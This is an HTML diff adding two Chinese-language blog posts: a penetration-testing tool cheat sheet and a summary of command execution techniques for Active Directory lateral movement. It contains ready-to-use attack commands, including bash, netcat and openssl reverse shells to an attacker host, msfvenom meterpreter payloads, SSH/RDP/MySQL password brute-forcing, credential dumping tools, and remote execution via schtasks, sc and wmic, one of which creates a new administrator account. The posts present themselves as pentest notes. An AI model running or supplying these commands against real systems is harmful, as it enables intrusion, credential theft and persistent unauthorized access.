@@ -258,6 +258,662 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/07/渗透测试各阶段工具速查-持续更新/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/08/07/渗透测试各阶段工具速查-持续更新/" itemprop="url">
+                  渗透测试各阶段工具速查(持续更新)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-07T21:29:37+08:00">
+                2020-08-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/08/07/渗透测试各阶段工具速查-持续更新/" class="leancloud_visitors" data-flag-title="渗透测试各阶段工具速查(持续更新)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是渗透测试各阶段工具和快速用法速查笔记，将会持续更新。</p>
+<h3 id="站点信息收集"><a href="#站点信息收集" class="headerlink" title="站点信息收集"></a>站点信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Google</span><br><span class="line">Fofa</span><br><span class="line">Shodan</span><br><span class="line">Zoomeye</span><br><span class="line">Goby</span><br><span class="line">whatweb</span><br><span class="line">Github</span><br><span class="line">robtex</span><br></pre></td></tr></table></figure>
+<h3 id="快速探测存活主机"><a href="#快速探测存活主机" class="headerlink" title="快速探测存活主机"></a>快速探测存活主机</h3><p>nmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt</span><br><span class="line">nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oX result.xml</span><br><span class="line">nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt -iL ip.txt</span><br></pre></td></tr></table></figure>
+<p>格式化输出存活ip，做后续详细扫描使用<br><a href="https://github.com/echohun/tools/blob/master/web%E6%89%AB%E6%8F%8F/nmap_clean_data.py" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/web%E6%89%AB%E6%8F%8F/nmap_clean_data.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</span><br><span class="line">-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</span><br><span class="line">-n： 禁止DNS反向解析；</span><br><span class="line">–open： 只输出检测状态为open的端口，即开放的端口；</span><br><span class="line">–min-hostgroup 4：调整并行扫描组的大小；</span><br><span class="line">–min-parallelism 1024：调整探测报文的并行度；</span><br><span class="line">–host-timeout 30：检测超时的跳过</span><br><span class="line">-T4：总共有T0-T5，貌似T4比较折中</span><br><span class="line">-v：打印详细扫描过程</span><br><span class="line">-oG：输出为比较人性化的格式，一条记录一行，后期好处理</span><br><span class="line">-iL：载入ip段文件，批量扫，不用一条条执行了。</span><br></pre></td></tr></table></figure>
+<p>ipscan</p>
+<h3 id="快速探测端口"><a href="#快速探测端口" class="headerlink" title="快速探测端口"></a>快速探测端口</h3><p>masscan的发包速度非常快，在windows中，它的发包速度可以达到每秒30万包；在Linux中，速度可以达到每秒160万。masscan在扫描时会随机选择目标IP，所以不会对远程的主机造成压力。<br><a href="https://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/112583.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masscan 172.18.2.1 -p1-65535 --rate=10000</span><br><span class="line">masscan -p80,8080-8100 10.0.0.0/8 -oL result_mas.txt --rate=10000</span><br><span class="line">masscan -p80,8080-8100 10.0.0.0/8 -oX result_mas.txt --rate=10000</span><br></pre></td></tr></table></figure></p>
+<h3 id="邮箱搜集工具"><a href="#邮箱搜集工具" class="headerlink" title="邮箱搜集工具"></a>邮箱搜集工具</h3><p>EmailSniper</p>
+<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>SubDominscanner</p>
+<h3 id="指纹收集"><a href="#指纹收集" class="headerlink" title="指纹收集"></a>指纹收集</h3><p>whatweb -v <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a></p>
+<h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>御剑</p>
+<p>Dirbuster</p>
+<p><a href="https://www.jianshu.com/p/79c7b1eda56e" target="_blank" rel="noopener">https://www.jianshu.com/p/79c7b1eda56e</a></p>
+<p>webpathbrute</p>
+<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>wvs</p>
+<p>burpsuite</p>
+<p>nessus（强烈推荐）</p>
+<p>xray</p>
+<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>hydra<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -V -l fakeroot -P top100.txt 172.18.2.177 ssh</span><br><span class="line">hydra -V -l admin -P top100.txt 172.18.2.177 rdp</span><br><span class="line">hydra -V -l root -P top100.txt 172.18.2.177 mysql</span><br></pre></td></tr></table></figure></p>
+<p>ncrack<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncrack -vv -d10 -user root -P top100.txt 172.18.2.177 -p ssh -g CL=10,at=3</span><br><span class="line">ncrack -vv -d10 -user root -P top100.txt 172.18.2.177 -p mysql -g CL=10,at=3</span><br></pre></td></tr></table></figure></p>
+<p>medusa<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">medusa -v 6 -h 172.18.2.177 -u fakeroot -P top100.txt -M ssh -t 10 -O out.txt</span><br><span class="line">medusa -v 6 -h 172.18.2.177 -u root -P top100.txt -M mysql -t 10 -O out.txt</span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>metasploit</p>
+<p>burpsuite</p>
+<p>sqlmap</p>
+<p>xxer （xml注入利用工具） <a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a> </p>
+<p>ysoserial （反序列化利用工具） <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p>Struts2-Scan （struts2历史漏洞扫描和利用） <a href="https://github.com/HatBoy/Struts2-Scan" target="_blank" rel="noopener">https://github.com/HatBoy/Struts2-Scan</a></p>
+<p>weblogicScanner （weblogic历史漏洞扫描利用） <a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p>
+<p>exphub （常见web框架cve利用） <a href="https://github.com/zhzyker/exphub" target="_blank" rel="noopener">https://github.com/zhzyker/exphub</a></p>
+<p>cve，cms，中间件，OA系统漏洞exp合集<br><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection</a></p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>菜刀</p>
+<p>蚁剑</p>
+<p>冰蝎</p>
+<p>cobalt strike</p>
+<p>普通反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/HOST/PORT 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>加密shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure></p>
+<p>nc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机 nc -lvp 4444</span><br><span class="line">靶机 nc -e /bin/bash xx.xx.xx.xx 4444</span><br></pre></td></tr></table></figure></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo提权<br><a href="http://next.uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p>
+<p>各类exp<br>典型通杀:脏牛CVE-2016-5195</p>
+<p>metasploit</p>
+<p>本地漏洞扫描工具</p>
+<p>windows/linux exploit suggester</p>
+<h3 id="本地口令获取和破解"><a href="#本地口令获取和破解" class="headerlink" title="本地口令获取和破解"></a>本地口令获取和破解</h3><p>hash-identifier 判断哈希类型</p>
+<p>mimikatz</p>
+<p>Mimipenguin</p>
+<p>LaZagne<br><a href="http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p>
+<p>hashcat+口令字典<br><a href="http://next.uuzdaisuki.com/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--hash-type 0 --attack-mode 0</span><br><span class="line">-m选择哈希类型</span><br><span class="line">1000为windows nt hash</span><br><span class="line">-a选择模式</span><br><span class="line">0 Straight（字典破解）</span><br><span class="line">1 Combination（组合破解）</span><br><span class="line">3 Brute-force（掩码暴力破解）</span><br><span class="line">6 Hybrid dict + mask（混合字典+掩码）</span><br><span class="line">7 Hybrid mask + dict（混合掩码+字典）</span><br></pre></td></tr></table></figure>
+<h3 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h3><p>linuxprivchecker</p>
+<p>LinEnum</p>
+<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>常见后门手法</p>
+<p>metasploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=170.170.64.17 LPORT=4444 -f elf -o reverse_tcp_linux64</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f exe -o reverse_tcp.exe</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST xxx.xxx.xxx.xxx</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">常用后续命令</span><br><span class="line">https://www.cnblogs.com/backlion/p/9484949.html</span><br></pre></td></tr></table></figure></p>
+<p>python直连反弹shell<br><a href="http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a><br>其他语言直连反弹shell  </p>
+<p>windows常见奇淫技巧后门手法<br><a href="http://next.uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/</a></p>
+<h3 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h3><p>Hydra</p>
+<p>nessus</p>
+<p>metasploit</p>
+<p>nmap</p>
+<p>powersploit</p>
+<p>Empire</p>
+<p>Psnmap</p>
+<p>lcx</p>
+<p>ew</p>
+<p>tunna</p>
+<p>proxychains</p>
+<p>FRP</p>
+<p>N2N</p>
+<h3 id="内网命令执行和文件访问"><a href="#内网命令执行和文件访问" class="headerlink" title="内网命令执行和文件访问"></a>内网命令执行和文件访问</h3><p>at</p>
+<p>schtasks</p>
+<p>telnet</p>
+<p>sc</p>
+<p>wmic</p>
+<p>wmiexec.vbs</p>
+<p>python impacket wmiexec.py</p>
+<p>psexec</p>
+<p>远程桌面</p>
+<h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p>Cain</p>
+<p>Arpspoof</p>
+<h3 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h3><p>pupy类远控</p>
+<p>teamview</p>
+<p>pcanywhere</p>
+<p>radmin</p>
+<p>手机端</p>
+<p>DroidJack</p>
+<p>Dendroid</p>
+<h3 id="典型windows-rce"><a href="#典型windows-rce" class="headerlink" title="典型windows-rce"></a>典型windows-rce</h3><p>ms17-010 基本通杀</p>
+<p>cve-2019-0708 开放3389情况 windows7及之前通杀</p>
+<h3 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h3><p>q-dir 文件管理工具，可开四个窗口</p>
+<p>beyond compare 文件/文本比较工具</p>
+<p>cmder 命令行工具</p>
+<p>everything 文件搜索工具 </p>
+<p>navicat 数据库连接工具，支持超多种类数据库，支持导出数据，甚至提供拖库的tunnel.php等</p>
+<p>悬剑3.0 超齐全windows工具库系统</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/06/ad域渗透命令执行总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/08/06/ad域渗透命令执行总结/" itemprop="url">
+                  ad域渗透命令执行总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-06T20:57:21+08:00">
+                2020-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/08/06/ad域渗透命令执行总结/" class="leancloud_visitors" data-flag-title="ad域渗透命令执行总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>AD的全称是Active Directory：活动目录<br>域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后两个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p>
+<p>在域渗透场景中，我们已经进入内网，会遇到大量的开放端口和服务，弱密码空密码，这个时候我们可以使用它们已经开启的服务选择对应的方式进行命令执行。本文对ad域渗透中常见的命令执行方式进行一个总结。</p>
+<h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>开启ipc共享</p>
+<p>配置本地安全策略：开始-&gt;运行-&gt; secpol.msc-&gt;本地策略-&gt;安全选项-&gt;网络访问：共享&gt;和本地帐户的安全模型&gt;经典-本地用户进行身份验证</p>
+<p>配置本地组策略：运行gpedit.msc ——计算机配置——Windows设置——安全设置——本地策略<br>——安全选项——用户账户控制：以管理员批准模式运行所有管理员——禁用。</p>
+<h3 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">写入后门文件</span><br><span class="line">net use z: \\目标IP\c$ &quot;passwd&quot; /user:&quot;admin&quot;</span><br><span class="line">或</span><br><span class="line">copy hack.bat \\目标ip\c$</span><br><span class="line">#删除连接</span><br><span class="line">net use \\目标IP\ipc$ /del</span><br></pre></td></tr></table></figure>
+<p>后续使用下面的方式执行</p>
+<h2 id="at-win10不可用"><a href="#at-win10不可用" class="headerlink" title="at(win10不可用)"></a>at(win10不可用)</h2><p>定时任务执行命令</p>
+<h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><p>开启windows Event log服务，开启Task Scheduler服务</p>
+<p>其余条件同ipc</p>
+<p>命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">at \\170.170.64.19 23:00 c:\windows\system32\calc.exe</span><br><span class="line">at \\170.170.64.19 1 delete /yes #删除本机1号任务</span><br></pre></td></tr></table></figure>
+<h2 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h2><h3 id="前提-2"><a href="#前提-2" class="headerlink" title="前提"></a>前提</h3><p>开启windows Event log服务，开启Task Scheduler服务</p>
+<p>其余条件同ipc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn firstTask /tr &quot;c:\windows\system32\cmd.exe /c calc&quot; /sc once /st 00:00 /S 170.170.64.19 /RU System /u admin /p passwd</span><br><span class="line">schtasks /run /tn firstTask /S 170.170.64.19 /u admin /p passwd</span><br><span class="line">schtasks /F /delete /tn firstTask /S 170.170.64.19 /u admin /p passwd</span><br></pre></td></tr></table></figure>
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><h3 id="前提-3"><a href="#前提-3" class="headerlink" title="前提"></a>前提</h3><p>开启telnet服务</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet 目标ip</span><br><span class="line">之后可执行命令</span><br></pre></td></tr></table></figure>
+<h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows2003</span><br><span class="line">windows XP</span><br></pre></td></tr></table></figure>
+<h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\170.170.64.19 create testSC binPath= &quot;cmd.exe /c start c:\windows\hack.bat&quot;</span><br><span class="line">sc \\170.170.64.19 start testSC</span><br><span class="line">sc \\170.170.64.19 delete testSC</span><br></pre></td></tr></table></figure>
+<h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><h3 id="前提-4"><a href="#前提-4" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p>
+<h3 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:170.170.64.19 /user:admin /password:passwd process call create &quot;cmd.exe /c calc.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:170.170.64.19 /user:admin /password:passwd process call create &quot;cmd.exe /c net user test 123456 /add &amp;&amp; net localgroup administrators test /add&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="wmiexec-vbs-需要安装"><a href="#wmiexec-vbs-需要安装" class="headerlink" title="wmiexec.vbs(需要安装)"></a>wmiexec.vbs(需要安装)</h2><h3 id="前提-5"><a href="#前提-5" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载vmiexec.vbs</p>
+<h3 id="命令执行-3"><a href="#命令执行-3" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 170.170.64.19 admin passwd</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 170.170.64.19 admin passwd &quot;cmdkey /list&quot;</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 170.170.64.19 admin passwd c:\programdata\test.bat</span><br><span class="line">#其他参数</span><br><span class="line">-wait5000 表示这个命令等待5s后再读取结果，用于运行“运行时间长”的命令。</span><br><span class="line">-persist 程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，用于运行 nc 或者木马程序。</span><br></pre></td></tr></table></figure>
+<h2 id="impackets-wmiexec-需要安装"><a href="#impackets-wmiexec-需要安装" class="headerlink" title="impackets wmiexec(需要安装)"></a>impackets wmiexec(需要安装)</h2><h3 id="前提-6"><a href="#前提-6" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p>
+<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket/</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install impacket</span><br></pre></td></tr></table></figure>
+<h3 id="命令执行-4"><a href="#命令执行-4" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取远程计算机交互式shell</span><br><span class="line">python wmiexec.py admin:passwd@170.170.64.19</span><br></pre></td></tr></table></figure>
+<h2 id="psexec-需要安装"><a href="#psexec-需要安装" class="headerlink" title="psexec(需要安装)"></a>psexec(需要安装)</h2><h3 id="前提-7"><a href="#前提-7" class="headerlink" title="前提"></a>前提</h3><p>开启admin$共享</p>
+<h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>在 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a> 下载安装</p>
